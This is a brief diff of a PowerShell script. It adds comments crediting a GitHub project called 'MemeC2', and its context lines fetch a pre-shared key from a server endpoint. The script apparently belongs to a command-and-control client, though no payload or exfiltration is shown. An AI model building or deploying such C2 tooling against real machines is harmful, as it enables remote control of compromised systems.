@@ -1,3 +1,6 @@
+# Credit to https://github.com/CeilingGang/MemeC2
+# Ceiling Gang AUUH!
+
 # Get the Pre-shared Key from the server
 $Response = Invoke-RestMethod -Method Get -Uri "$Endpoint/hej_monika"
 $PSK = $Response
